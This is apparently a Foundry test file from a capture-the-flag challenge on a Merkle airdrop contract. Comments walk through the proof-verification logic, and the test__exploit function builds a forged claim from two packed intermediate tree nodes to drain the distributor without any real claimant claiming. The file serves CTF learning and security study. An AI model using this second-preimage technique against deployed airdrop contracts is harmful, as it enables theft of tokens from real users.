// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/console2.sol";
import "forge-std/Test.sol";
import {Setup, Token, MerkleDistributor} from "../src/merkle-drop/Setup.sol";

/**
 * Setup:
 *   - merkleDistributor is setup with token "token" and a merkle root of "0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3
 *   - token drops 75000 tokens to merkleDistrubutor contract
 *
 * Pass Conditions:
 *   - MerkleDistributor must have a zero balance
 *   - All 64 claimants must not have claimed
 *
 * Solution:
 *   - Meaning some proof or proofs outside of the tree.json must be found to
 *     claim the tokens
 *   - Proof Logic:
 *     - A computedHash is derived by hashing of the index + account + amount,
 *       which represents a "leaf" or "node" of the merkle tree
 *     - This along with the merkle root and proof are passed to the verify() function
 *     - verify() iterates over each element in the proof array
 *     - if the computedHash < proofElement, computedHash becomes
 *       hash(computed hash + proof element)
 *     - otherwise computed hash becomes hash(proof element + computed hash)
 *     - If the computed hash equals the root, then it's proven that the index,
 *       account and amount initially passed is correct.
 *   - Thoughts:
 *     - The verify function provides no validation of a proof array of 0 length
 *       is necessary. Thereby if an index account and amount can be found where
 *       the hash of them matches the merkle root than it should be
 *       withdrawable.
 *       Thats obviously impossible as would require to reverse a hash function
 *     - Is it possible to extend the leafs beyond the currently existing tree?
 *       We could "grow" the tree using the information we have to construct the
 *       65th and 66th index. This is not possible as again to "grow" the tree
 *       is impossible as it would require breaking keccak
 *
 *
 */
contract ExploitMerkleDrop is Test {
    Setup s;
    Token t;
    MerkleDistributor md;

    function setUp() public {
        s = new Setup();
        t = s.token();
        md = s.merkleDistributor();
    }

    function test__claim() public {
        address account = 0x00E21E550021Af51258060A0E18148e36607C9df;
        uint256 index = 0;
        uint96 amount = 0x09906894166afcc878;
        bytes32[] memory proof = new bytes32[](6);

        uint256 prevMdBalance = t.balanceOf(address(md));
        proof[0] = bytes32(0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a);
        proof[1] = bytes32(0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69);
        proof[2] = bytes32(0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298);
        proof[3] = bytes32(0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f);
        proof[4] = bytes32(0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e);
        proof[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);

        md.claim(index, account, amount, proof);

        uint256 postMdBalance = t.balanceOf(address(md));
        assertEq(prevMdBalance, postMdBalance + amount);
        assertTrue(md.isClaimed(index));
    }

    function test__exploit() public {
        // address account0 = 0x00E21E550021Af51258060A0E18148e36607C9df;
        // uint256 index0 = 0;
        // uint96 amount0 = type(uint96).max;//0x09906894166afcc878;
        // bytes32 node0 = keccak256(abi.encodePacked(index0, account0, amount0));
        // bytes32 n0 = 0xa9e8f0fbf0d2911d746500a7786606d3fc80abb68a05f77fb730ded04a951c2d;
        // assertEq(node0, n0);

        // address account58 = 0xcee18609823ac7c71951fe05206C9924722372A6;
        // uint256 index58 = 58;
        // uint96 amount58 = 0x3dfa72c4c7dd942165;
        // bytes32 node58 = keccak256(abi.encodePacked(index58, account58, amount58));
        // bytes32 n58 = 0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a;
        // assertEq(node58, n58);

        // console.logBytes32(bytes32() << 2);
        // console.log(node58 < n0);
        // console.logBytes32(keccak256(abi.encodePacked(node58, n0)));

        bytes32[] memory proof = new bytes32[](5);
        proof[0] = bytes32(0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69);
        proof[1] = bytes32(0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298);
        proof[2] = bytes32(0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f);
        proof[3] = bytes32(0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e);
        proof[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
        uint256 index =
            0xA37B8b0377C63d3582581C28a09C10284a03a6c4185dfa5c29e20dbce1a1427a;
        address account = 0xa9e8F0FBF0d2911d746500A7786606d3fC80abb6;
        uint96 amount = 0x8a05f77fb730ded04a951c2d;
        console2.log(abi.encodePacked(index, account, amount).length);
        md.claim(index, account, amount, proof);
        // if (computedHash < proofElement) {
        //     // Hash(current computed hash + current element of the proof)
        //     computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
        // } else {
        //     // Hash(current element of the proof + current computed hash)
        //     computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
        // }
        //console.log("node:", uint256(node));
        //assertTrue(s.isSolved());
    }
}
